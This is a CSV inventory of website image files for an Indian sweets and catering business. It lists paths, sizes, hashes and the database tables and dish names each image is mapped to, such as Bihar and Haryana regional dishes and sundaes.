blog_7_content_1.jpg,notforgittrack/blog/img/blog_7_content_1.jpg,547257,bd3e2e6695a1f047e645fab8bf83ed472485b17e6a3b5aca6ee6bf6669a8f4d1,dbf5ee834e7dc66967aa66d6436e3475,Static / Orphaned Disk Asset,,,,
blog_7_featured.jpg,notforgittrack/blog/img/blog_7_featured.jpg,547257,bd3e2e6695a1f047e645fab8bf83ed472485b17e6a3b5aca6ee6bf6669a8f4d1,dbf5ee834e7dc66967aa66d6436e3475,Static / Orphaned Disk Asset,,,,
blog_8_featured.jpg,notforgittrack/blog/img/blog_8_featured.jpg,569737,f0d04c7c8ecc9de9a2a67428dcd3bc05845d98855e479832761bd88c0f31c26e,1b98311153207703a4a84d85d8fec3a5,Static / Orphaned Disk Asset,,,,
blog_9_content_1.jpeg,notforgittrack/blog/img/blog_9_content_1.jpeg,531729,679a3359ed7540a3cd0f6e01bf50fa24ebcbe05e2e6952d60af85e081516510c,4c36883a9827773e58c8ae0a7bc8ac3c,Static / Orphaned Disk Asset,,,,
blog_9_featured.jpeg,notforgittrack/blog/img/blog_9_featured.jpeg,531729,679a3359ed7540a3cd0f6e01bf50fa24ebcbe05e2e6952d60af85e081516510c,4c36883a9827773e58c8ae0a7bc8ac3c,Static / Orphaned Disk Asset,,,,
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
10.jpeg,notforgittrack/the-famous-halwai-images/images/10.jpeg,14662,ef167e1088bca29a322b4f713173de84605c905cfc97b01cde3a54f91b11a405,d9f091839b78fe2c7def2ba115d1d9d7,DB Mapped (Verified),menu_item_tbl,10,Dal Makhini,menu_img
100.jpg,notforgittrack/the-famous-halwai-images/images/100.jpg,78801,d3e5e53fd4b44cf70760db76ee699f9a44f73d6d52bad34103ffef3323a351ae,647e9fc160ac7056fe6873378331eff5,DB Mapped (Verified),menu_item_tbl,100,Gulgula - Uttarakhand,menu_img
101.jpeg,notforgittrack/the-famous-halwai-images/images/101.jpeg,10706,f430f7e757ba74fd9a0ccfce38a7da2f97215c4fd7359fd7e89c25aae82267c8,a0e0720d83d2d753685025cafe882741,DB Mapped (Verified),menu_item_tbl,101,Arsa - Uttarakhand,menu_img
102.jpg,notforgittrack/the-famous-halwai-images/images/102.jpg,51889,446392921d32a1ab25bbb70c2c3020ba52fe9934eab4c5a71e54607e5df34ffe,258b993b6b5a6722d5473c7281395c78,DB Mapped (Verified),menu_item_tbl,102,Naivedyam - Bihar,menu_img
103.jpeg,notforgittrack/the-famous-halwai-images/images/103.jpeg,9435,a81ffe193d71e631dc23cca09584190f1a2f43eb11611089a67cf31c2ae2349b,3b6ec918699f45dedc99d71ad1599d32,DB Mapped (Verified),menu_item_tbl,103,Chandrakala/ Pedakiya - Bihar,menu_img
104.jpg,notforgittrack/the-famous-halwai-images/images/104.jpg,26446,ddf92b39bd8e40bb92745bc365d58e238d35685faa2c388b8881a10e2081f16f,9da451a4d260ca86e3a500b6db3815a4,DB Mapped (Verified),menu_item_tbl,104,Khaja - Bihar,menu_img
105.webp,notforgittrack/the-famous-halwai-images/images/105.webp,26278,bd42909481a32c597353c59f38b3803fda71af01c2e876e8cec31b950ab76f8e,a95e04498293165e0c0cc393e09c9641,DB Mapped (Verified),menu_item_tbl,105,Kesar Peda - Bihar,menu_img
106.jpg,notforgittrack/the-famous-halwai-images/images/106.jpg,407462,341988e7a8b56b4d76ab7741e9c7fe3eae23ddeed0b538f3d57770abcfcfd4be,910a2dc7e3ccb2cff43b79b18f892bcc,DB Mapped (Verified),menu_item_tbl,106,Laung-Latika - Bihar,menu_img
107.jpeg,notforgittrack/the-famous-halwai-images/images/107.jpeg,10671,90d20dd37a2bc1dccad657ff692e4df222d9f4ef5d6040b236058243e56ddcdc,61edca3845f7f315ecbedf496373fb01,DB Mapped (Verified),menu_item_tbl,107,Malpua - Bihar,menu_img
108.webp,notforgittrack/the-famous-halwai-images/images/108.webp,19502,b4712da72a5152ce80550039dd891bb0a51117d6ed2cc6e620a9591e7d0711ad,3d303359ad00ffdb30722314c9ac9149,DB Mapped (Verified),menu_item_tbl,108,Rasia - Bihar,menu_img
11.jpg,notforgittrack/the-famous-halwai-images/images/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),menu_item_tbl,11,Dal Tadka,menu_img
11.jpg,notforgittrack/the-famous-halwai-images/images/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),product_item_tbl,11,Balushai,menu_img
11.jpg,notforgittrack/the-famous-halwai-images/images/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),website_gallery,11,Event at Delhi,gimage
11.jpg,notforgittrack/the-famous-halwai-images/images/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),worke_work_experience,11,North Indian Dishes by,workproimg
11.jpg,notforgittrack/the-famous-halwai-images/images/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),recipe_appliances_kits,11,Yellow Bell Pepper,kits_img
110.jpeg,notforgittrack/the-famous-halwai-images/images/110.jpeg,10093,6b4c5e210163c4b4644bfc0750a7ea8db60057ee2470c57e87436330be1a4649,4d513da840b1054e04c581ba063d1c5a,DB Mapped (Verified),menu_item_tbl,110,Khurma And Laktho - Bihar,menu_img
111.jpeg,notforgittrack/the-famous-halwai-images/images/111.jpeg,6969,4c4cf62755a61b9c9419f6300116f4f5ea434e44253dfa43195a1944f9259f1a,68b7c2719cf26963173ea6ef68076319,DB Mapped (Verified),menu_item_tbl,111,Balushahi - Bihar,menu_img
112.jpeg,notforgittrack/the-famous-halwai-images/images/112.jpeg,7632,9fc8b53bba400bcd797ac25b3b181c5c9886323be6849960ba5cbbf35805777f,80e0eb316316377eb627f63e0f4d2ca0,DB Mapped (Verified),menu_item_tbl,112,Parwal ki Mithai - Bihar,menu_img
113.jpeg,notforgittrack/the-famous-halwai-images/images/113.jpeg,112246,0825d65ecdf014c2b0a56a849d71ac2bd0143b9b37f87cb05802788fbda1e96e,2b754ec5aeeed8ca93b5a8e7d33e741a,DB Mapped (Verified),menu_item_tbl,113,Gur Anarsa - Bihar,menu_img
114.jpeg,notforgittrack/the-famous-halwai-images/images/114.jpeg,35872,6e92d6bf9ed356dca00f024f86925df5e80bfc661fa452f26c40c06585ab6690,7861923a3f78ca8532ec6b315d96b8c8,DB Mapped (Verified),menu_item_tbl,114,Laai - Bihar,menu_img
115.jpeg,notforgittrack/the-famous-halwai-images/images/115.jpeg,8888,3b1e69bace003789c889c06ea6a6bb0649fff14196f82c6e350aef0bb8f4ad04,7d0d9f8672ad36a72ad2b77c8974f58b,DB Mapped (Verified),menu_item_tbl,115,Tilkut - Bihar,menu_img
116.jpg,notforgittrack/the-famous-halwai-images/images/116.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,116,Litti Chokha - Bihar,menu_img
116.jpg,notforgittrack/the-famous-halwai-images/images/116.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,116,Litti Chokha - Bihar,menu_small_img
117.jpg,notforgittrack/the-famous-halwai-images/images/117.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,117,Chana Ghugni - Bihar,menu_img
117.jpg,notforgittrack/the-famous-halwai-images/images/117.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,117,Chana Ghugni - Bihar,menu_small_img
118.jpg,notforgittrack/the-famous-halwai-images/images/118.jpg,14617,b97b73de898a9696ad59302bcea5a6d9e645747f0b73150b2f0994620a595528,f261d7eb63d1769cd2a1f309fa6774f8,DB Mapped (Verified),menu_item_tbl,118,Mutton Kebabs & Reshmi Kebabs - Bihar,menu_img
118.jpg,notforgittrack/the-famous-halwai-images/images/118.jpg,14617,b97b73de898a9696ad59302bcea5a6d9e645747f0b73150b2f0994620a595528,f261d7eb63d1769cd2a1f309fa6774f8,DB Mapped (Verified),menu_item_tbl,118,Mutton Kebabs & Reshmi Kebabs - Bihar,menu_small_img
119.jpeg,notforgittrack/the-famous-halwai-images/images/119.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,119,Dal Peetha - Bihar,menu_img
119.jpeg,notforgittrack/the-famous-halwai-images/images/119.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,119,Dal Peetha - Bihar,menu_small_img
12.webp,notforgittrack/the-famous-halwai-images/images/12.webp,50084,da26dbfd180c3f7b774c92b0ca4643762e56f3b45114129f42158177e166eb57,3f9c183cef6e5274b434112eb69709b3,DB Mapped (Verified),menu_item_tbl,12,Malai Kofta,menu_img
120.jpg,notforgittrack/the-famous-halwai-images/images/120.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,120,Khajuria/Thekua - Bihar,menu_img
120.jpg,notforgittrack/the-famous-halwai-images/images/120.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,120,Khajuria/Thekua - Bihar,menu_small_img
121.webp,notforgittrack/the-famous-halwai-images/images/121.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,121,Puri Sabzi - Bihar,menu_img
121.webp,notforgittrack/the-famous-halwai-images/images/121.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,121,Puri Sabzi - Bihar,menu_small_img
122.jpg,notforgittrack/the-famous-halwai-images/images/122.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,122,Sattu Sharbat - Bihar,menu_img
122.jpg,notforgittrack/the-famous-halwai-images/images/122.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,122,Sattu Sharbat - Bihar,menu_small_img
123.JPG,notforgittrack/the-famous-halwai-images/images/123.JPG,15529,c7bb429187506f63d57abab808b7b2ce858ec9bef33609c256451558a92000b5,cbd559d3da348464d918e8b6055fc49a,DB Mapped (Verified),menu_item_tbl,123,Sattu Paratha - Bihar,menu_img
123.JPG,notforgittrack/the-famous-halwai-images/images/123.JPG,15529,c7bb429187506f63d57abab808b7b2ce858ec9bef33609c256451558a92000b5,cbd559d3da348464d918e8b6055fc49a,DB Mapped (Verified),menu_item_tbl,123,Sattu Paratha - Bihar,menu_small_img
124.jpeg,notforgittrack/the-famous-halwai-images/images/124.jpeg,15745,036ac766a5cdb5653f0c05e1ca831eb33198374ef92fee4576b50e34fa4f62e8,32c0bcebbeeca789df9c4922e0dc18dd,DB Mapped (Verified),menu_item_tbl,124,Singri ki Sabzi,menu_img
124.jpeg,notforgittrack/the-famous-halwai-images/images/124.jpeg,15745,036ac766a5cdb5653f0c05e1ca831eb33198374ef92fee4576b50e34fa4f62e8,32c0bcebbeeca789df9c4922e0dc18dd,DB Mapped (Verified),menu_item_tbl,124,Singri ki Sabzi,menu_small_img
125.webp,notforgittrack/the-famous-halwai-images/images/125.webp,60970,a3386d5b9020fdbe376bff387353dbf4e5218dca060dd660f4165ac1d6d348fa,c32749492254243f209f7de604355af3,DB Mapped (Verified),menu_item_tbl,125,Mixed Dals,menu_img
125.webp,notforgittrack/the-famous-halwai-images/images/125.webp,60970,a3386d5b9020fdbe376bff387353dbf4e5218dca060dd660f4165ac1d6d348fa,c32749492254243f209f7de604355af3,DB Mapped (Verified),menu_item_tbl,125,Mixed Dals,menu_small_img
126.jpeg,notforgittrack/the-famous-halwai-images/images/126.jpeg,8207,55acdf72c5a3760c5fdd910330645fd20e0737e4d5efd00a2f2958dcfab21da9,f2766e3ceec3a52d9fc05b9a4be70c5e,DB Mapped (Verified),menu_item_tbl,126,Hara Dhania Choliya,menu_img
126.jpeg,notforgittrack/the-famous-halwai-images/images/126.jpeg,8207,55acdf72c5a3760c5fdd910330645fd20e0737e4d5efd00a2f2958dcfab21da9,f2766e3ceec3a52d9fc05b9a4be70c5e,DB Mapped (Verified),menu_item_tbl,126,Hara Dhania Choliya,menu_small_img
127.jpeg,notforgittrack/the-famous-halwai-images/images/127.jpeg,13441,7c83bebb5b99b29c1fb4eee0543371ef2c8480d66f297e7bf7121c1fa070345d,933ac02c763255c99f4f237a6085efbc,DB Mapped (Verified),menu_item_tbl,127,Kadhi Pakora,menu_img
127.jpeg,notforgittrack/the-famous-halwai-images/images/127.jpeg,13441,7c83bebb5b99b29c1fb4eee0543371ef2c8480d66f297e7bf7121c1fa070345d,933ac02c763255c99f4f237a6085efbc,DB Mapped (Verified),menu_item_tbl,127,Kadhi Pakora,menu_small_img
128.jpeg,notforgittrack/the-famous-halwai-images/images/128.jpeg,12345,cc2ca49cf5f587b56ea4e7766413463cc4719ad18e1f639441b367c85a0cd182,3960a6a9093d1e84d06087ce3c3ee27a,DB Mapped (Verified),menu_item_tbl,128,Kachri ki Chutney,menu_img
128.jpeg,notforgittrack/the-famous-halwai-images/images/128.jpeg,12345,cc2ca49cf5f587b56ea4e7766413463cc4719ad18e1f639441b367c85a0cd182,3960a6a9093d1e84d06087ce3c3ee27a,DB Mapped (Verified),menu_item_tbl,128,Kachri ki Chutney,menu_small_img
129.jpeg,notforgittrack/the-famous-halwai-images/images/129.jpeg,13520,637261aa3b31c7ed6fe754c5775a9583f94bb34ebff5f30a78ea622fc06b86b1,eba4f73c182fbbd2b0c92f271cec9a34,DB Mapped (Verified),menu_item_tbl,129,Tamatar Chutney,menu_img
129.jpeg,notforgittrack/the-famous-halwai-images/images/129.jpeg,13520,637261aa3b31c7ed6fe754c5775a9583f94bb34ebff5f30a78ea622fc06b86b1,eba4f73c182fbbd2b0c92f271cec9a34,DB Mapped (Verified),menu_item_tbl,129,Tamatar Chutney,menu_small_img
13.jpg,notforgittrack/the-famous-halwai-images/images/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),menu_item_tbl,13,Paneer Lababdar,menu_img
13.jpg,notforgittrack/the-famous-halwai-images/images/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),product_item_tbl,13,Besan Laddo,menu_img
13.jpg,notforgittrack/the-famous-halwai-images/images/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),website_gallery,13,Evevt At rishikesh,gimage
13.jpg,notforgittrack/the-famous-halwai-images/images/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),worke_work_experience,13,tarters Dishes by1,workproimg
13.jpg,notforgittrack/the-famous-halwai-images/images/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),recipe_appliances_kits,13,Mint Leaves,kits_img
130.webp,notforgittrack/the-famous-halwai-images/images/130.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,130,Dahi Vada,menu_img
130.webp,notforgittrack/the-famous-halwai-images/images/130.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,130,Dahi Vada,menu_small_img
131.jpeg,notforgittrack/the-famous-halwai-images/images/131.jpeg,8644,3e1664cceb6cccbe94034ff6f23fd625aec6c62202c0662c59c2d1e517fe9b36,7693d33c11abb4aae524e9721d27910a,DB Mapped (Verified),menu_item_tbl,131,Rajma Chawal,menu_img
131.jpeg,notforgittrack/the-famous-halwai-images/images/131.jpeg,8644,3e1664cceb6cccbe94034ff6f23fd625aec6c62202c0662c59c2d1e517fe9b36,7693d33c11abb4aae524e9721d27910a,DB Mapped (Verified),menu_item_tbl,131,Rajma Chawal,menu_small_img
132.webp,notforgittrack/the-famous-halwai-images/images/132.webp,64206,0a70e0fbb6880820ac7b5af61ebd1bdc155425e4300a85756d67b2984880d2f3,2f7c55da53a4fbdb269b62547a1f2d3d,DB Mapped (Verified),menu_item_tbl,132,Malpua - Haryana,menu_img
133.jpg,notforgittrack/the-famous-halwai-images/images/133.jpg,69900,5be4b95a5a85ab589e87158aa55cb0841709d018a5653455fe540c4c9637e16e,9dc1b72a7b16e8e5eed4ac234cbdb91d,DB Mapped (Verified),menu_item_tbl,133,Mithe Chawal - Haryana,menu_img
134.jpeg,notforgittrack/the-famous-halwai-images/images/134.jpeg,12412,970cbbaaf4a9ce0ae5bf44fc49f8b7ed5ea89f5f7593b4138be36e5406e9d877,9a44fce152a4c98cf31c777ec4803c3d,DB Mapped (Verified),menu_item_tbl,134,Methi Gaajar - Haryana,menu_img
135.webp,notforgittrack/the-famous-halwai-images/images/135.webp,48044,d9b7b2405ab798dd5967a56466192c2914d9cb1bb11234ca63c726b9f272bc42,0223b17c9173ad29d80b619bf5323eb8,DB Mapped (Verified),menu_item_tbl,135,Alsi ki Pinni - Haryana,menu_img
136.jpg,notforgittrack/the-famous-halwai-images/images/136.jpg,54895,3098d32e20e94dd88233a4a9b3f3909a890e1a5f4534d5d9ed18e5f53547066e,69f7df5a20166f610db024e2d4f4b6cb,DB Mapped (Verified),menu_item_tbl,136,Besan Masala Roti - Haryana,menu_img
136.jpg,notforgittrack/the-famous-halwai-images/images/136.jpg,54895,3098d32e20e94dd88233a4a9b3f3909a890e1a5f4534d5d9ed18e5f53547066e,69f7df5a20166f610db024e2d4f4b6cb,DB Mapped (Verified),menu_item_tbl,136,Besan Masala Roti - Haryana,menu_small_img
137.jpg,notforgittrack/the-famous-halwai-images/images/137.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,137,Bhura Roti Ghee - Haryana,menu_img
137.jpg,notforgittrack/the-famous-halwai-images/images/137.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,137,Bhura Roti Ghee - Haryana,menu_small_img
138.jpg,notforgittrack/the-famous-halwai-images/images/138.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,138,Bajara Aloo Roti - Haryana,menu_img
138.jpg,notforgittrack/the-famous-halwai-images/images/138.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,138,Bajara Aloo Roti - Haryana,menu_small_img
139.jpg,notforgittrack/the-famous-halwai-images/images/139.jpg,40862,31fa2e605a8c91f8ba84ba4bc40c7de93f009e5f7228d005580c828316f0138b,68fa040f3aa3bd5e802c8b2e778db746,DB Mapped (Verified),menu_item_tbl,139,Bajara Khichri - Haryana,menu_img
14.jpeg,notforgittrack/the-famous-halwai-images/images/14.jpeg,9108,11f6d2118b1fe891203710e26ef40071c21c4cdf10caee5ad42b9e840915b620,b5c735c46baf1441994ba535dd1ab4a5,DB Mapped (Verified),menu_item_tbl,14,Dum Aloo,menu_img
140.jpeg,notforgittrack/the-famous-halwai-images/images/140.jpeg,7669,fa4d481752bdc7bc7801f9106faa6c20b638ced816afa610b72037a782d278e8,5c180f7e63936651b3563ec423436e81,DB Mapped (Verified),menu_item_tbl,140,Pine Apple Sundae,menu_img
140.jpeg,notforgittrack/the-famous-halwai-images/images/140.jpeg,7669,fa4d481752bdc7bc7801f9106faa6c20b638ced816afa610b72037a782d278e8,5c180f7e63936651b3563ec423436e81,DB Mapped (Verified),menu_item_tbl,140,Pine Apple Sundae,menu_small_img
141.jpg,notforgittrack/the-famous-halwai-images/images/141.jpg,12444,a4d1e6fd32dcb11c1805af040118345b4e83d787fb4349b6c1bf85513b4e4432,f6e8c472da88613089fc32ad1afedd42,DB Mapped (Verified),menu_item_tbl,141,Strawberry Sundae,menu_img
141.jpg,notforgittrack/the-famous-halwai-images/images/141.jpg,12444,a4d1e6fd32dcb11c1805af040118345b4e83d787fb4349b6c1bf85513b4e4432,f6e8c472da88613089fc32ad1afedd42,DB Mapped (Verified),menu_item_tbl,141,Strawberry Sundae,menu_small_img
142.jpg,notforgittrack/the-famous-halwai-images/images/142.jpg,23366,7f88888b24a4f13d8ae83a5a0c7780c3697ef1bb3ea067dfe952639e103b6298,e1a08a5fd3c9c418103ff8afc0a7889a,DB Mapped (Verified),menu_item_tbl,142,Cocktail Sundae,menu_img
142.jpg,notforgittrack/the-famous-halwai-images/images/142.jpg,23366,7f88888b24a4f13d8ae83a5a0c7780c3697ef1bb3ea067dfe952639e103b6298,e1a08a5fd3c9c418103ff8afc0a7889a,DB Mapped (Verified),menu_item_tbl,142,Cocktail Sundae,menu_small_img
143.jpeg,notforgittrack/the-famous-halwai-images/images/143.jpeg,11533,df56393535e8b4191a58a03d734cb4efa3ac9d21925098d06e4c76d094704444,cce2859ec6ebc971e3f16d5020569347,DB Mapped (Verified),menu_item_tbl,143,Himalayan Queen,menu_img
143.jpeg,notforgittrack/the-famous-halwai-images/images/143.jpeg,11533,df56393535e8b4191a58a03d734cb4efa3ac9d21925098d06e4c76d094704444,cce2859ec6ebc971e3f16d5020569347,DB Mapped (Verified),menu_item_tbl,143,Himalayan Queen,menu_small_img
144.jpeg,notforgittrack/the-famous-halwai-images/images/144.jpeg,10974,73f217d244a73bb88e7958939895b8398880db99ef3823190b7256d3f7a83de5,691fc6c515da19506f2eff1715d6ca73,DB Mapped (Verified),menu_item_tbl,144,Orange Crunch,menu_img
144.jpeg,notforgittrack/the-famous-halwai-images/images/144.jpeg,10974,73f217d244a73bb88e7958939895b8398880db99ef3823190b7256d3f7a83de5,691fc6c515da19506f2eff1715d6ca73,DB Mapped (Verified),menu_item_tbl,144,Orange Crunch,menu_small_img
145.jpeg,notforgittrack/the-famous-halwai-images/images/145.jpeg,6307,e228d22fb26462e25327f917c683a6245e96ea716d4f0bfdbf95f3f84f36e487,2d72d6f7ba5460c67982af491dba4fa1,DB Mapped (Verified),menu_item_tbl,145,Kesar Badam,menu_img
146.jpg,notforgittrack/the-famous-halwai-images/images/146.jpg,8011,1ae71de6fa5b5f26904cb5f41c0b903f3e081447612349b8005aeef7620870ec,c0f55f638435192fc5acc87107d2b796,DB Mapped (Verified),menu_item_tbl,146,Strawberry,menu_img
147.jpg,notforgittrack/the-famous-halwai-images/images/147.jpg,40941,547415841f861cf84ec65721627e26ab98d47f973f7086d4256091af80dbcdc9,45c281d08d39fb40bb9d9b1c9a04f9cd,DB Mapped (Verified),menu_item_tbl,147,Badshahi Gulab,menu_img
147.jpg,notforgittrack/the-famous-halwai-images/images/147.jpg,40941,547415841f861cf84ec65721627e26ab98d47f973f7086d4256091af80dbcdc9,45c281d08d39fb40bb9d9b1c9a04f9cd,DB Mapped (Verified),menu_item_tbl,147,Badshahi Gulab,menu_small_img
148.jpeg,notforgittrack/the-famous-halwai-images/images/148.jpeg,6860,d8faea01fc1c173cbf719880dab13a2ebb0dbadc3ed1f4841b8a296a00528372,2bf5327e3981305dbc3e4f56343ef73c,DB Mapped (Verified),menu_item_tbl,148,Vanilla,menu_img
148.jpeg,notforgittrack/the-famous-halwai-images/images/148.jpeg,6860,d8faea01fc1c173cbf719880dab13a2ebb0dbadc3ed1f4841b8a296a00528372,2bf5327e3981305dbc3e4f56343ef73c,DB Mapped (Verified),menu_item_tbl,148,Vanilla,menu_small_img
149.jpeg,notforgittrack/the-famous-halwai-images/images/149.jpeg,8557,e5de28920e29d25df45c720f6587ee27d405a0c08785da8b3dd23bd8a7e3e0a4,0410f9e52f320f33b6bdbdb6055684ee,DB Mapped (Verified),menu_item_tbl,149,Pine Apple,menu_img
149.jpeg,notforgittrack/the-famous-halwai-images/images/149.jpeg,8557,e5de28920e29d25df45c720f6587ee27d405a0c08785da8b3dd23bd8a7e3e0a4,0410f9e52f320f33b6bdbdb6055684ee,DB Mapped (Verified),menu_item_tbl,149,Pine Apple,menu_small_img
15.jpeg,notforgittrack/the-famous-halwai-images/images/15.jpeg,12401,b92087b551fe3e61b6296363c20dde53f13f05639050518182a437d93ea832f6,90f3a9aa0644da109e97301f7fe4077a,DB Mapped (Verified),menu_item_tbl,15,Soya Chaap (Gravy),menu_img
150.jpeg,notforgittrack/the-famous-halwai-images/images/150.jpeg,6307,e228d22fb26462e25327f917c683a6245e96ea716d4f0bfdbf95f3f84f36e487,2d72d6f7ba5460c67982af491dba4fa1,DB Mapped (Verified),menu_item_tbl,150,Kesar Badam,menu_img
150.jpeg,notforgittrack/the-famous-halwai-images/images/150.jpeg,6307,e228d22fb26462e25327f917c683a6245e96ea716d4f0bfdbf95f3f84f36e487,2d72d6f7ba5460c67982af491dba4fa1,DB Mapped (Verified),menu_item_tbl,150,Kesar Badam,menu_small_img
151.jpeg,notforgittrack/the-famous-halwai-images/images/151.jpeg,10535,02301194d3c3d6f6583405751a0263845772ad637150aaba5f93982923ce8c6d,edf2cf651611e23e52c3b3091c967439,DB Mapped (Verified),menu_item_tbl,151,Kaju Anjeer,menu_img
151.jpeg,notforgittrack/the-famous-halwai-images/images/151.jpeg,10535,02301194d3c3d6f6583405751a0263845772ad637150aaba5f93982923ce8c6d,edf2cf651611e23e52c3b3091c967439,DB Mapped (Verified),menu_item_tbl,151,Kaju Anjeer,menu_small_img
152.jpg,notforgittrack/the-famous-halwai-images/images/152.jpg,8011,1ae71de6fa5b5f26904cb5f41c0b903f3e081447612349b8005aeef7620870ec,c0f55f638435192fc5acc87107d2b796,DB Mapped (Verified),menu_item_tbl,152,Strawberry,menu_img
152.jpg,notforgittrack/the-famous-halwai-images/images/152.jpg,8011,1ae71de6fa5b5f26904cb5f41c0b903f3e081447612349b8005aeef7620870ec,c0f55f638435192fc5acc87107d2b796,DB Mapped (Verified),menu_item_tbl,152,Strawberry,menu_small_img
153.jpg,notforgittrack/the-famous-halwai-images/images/153.jpg,84853,96b8c1215b0693fbc2fefc6cb67bc63facea4037e268617af84cca476b29d4da,932b50de261ea98415234af7dd0a9d7e,DB Mapped (Verified),menu_item_tbl,153,Black Current,menu_img
